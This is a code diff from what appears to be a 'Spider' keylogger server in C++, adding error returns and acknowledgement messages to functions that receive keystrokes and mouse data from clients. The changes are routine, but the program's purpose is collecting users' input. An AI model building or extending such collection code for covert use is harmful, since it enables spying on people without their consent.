@@ -58,11 +58,13 @@ void			Spider::doFirstConnection()
       if (_proto != PROTOCOL_VERSION) {
 	std::cerr << "Wrong protocole" << std::endl;
 	dieInDignity();
+	return ;
       }
 
       if ((sizeName = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
 	std::cerr << "Wrong string size allowed" << std::endl;
 	dieInDignity();
+	return ;
       }
 
       _buffer.reset();
@@ -83,12 +85,7 @@ void			Spider::doFirstConnection()
 	      }
 
 	      uint16_t	*reponse = new uint16_t;
-
 	      *reponse = 2 << 8 | 2;
-
-	      // char *reponse = new char[2];
-	      // reponse[0] = 2;
-	      // reponse[1] = 2;
 	      _socket->async_write(reponse, 2, [this, reponse]() mutable {
 		  delete reponse;
 		  boost::asio::spawn(_web.get_ioservice(), [this](boost::asio::yield_context yield) {
@@ -175,6 +172,11 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
     return ;
   }
 
+  uint16_t	reponse = 2 << 8 | 3;
+  if (_socket->async_write(&reponse, 2, yield)) {
+    return ;
+  }
+
   std::fill(_str, _str + SIZE_STRING, 0);
   _buffer.getValue<char>(_str, sizeText);
 
@@ -222,6 +224,11 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
 
   _buffer.reset();
   if (_socket->async_read(_buffer.data(), 5, yield)) {
+    return ;
+  }
+
+  uint16_t	reponse = 2 << 8 | 3;
+  if (_socket->async_write(&reponse, 2, yield)) {
     return ;
   }
 
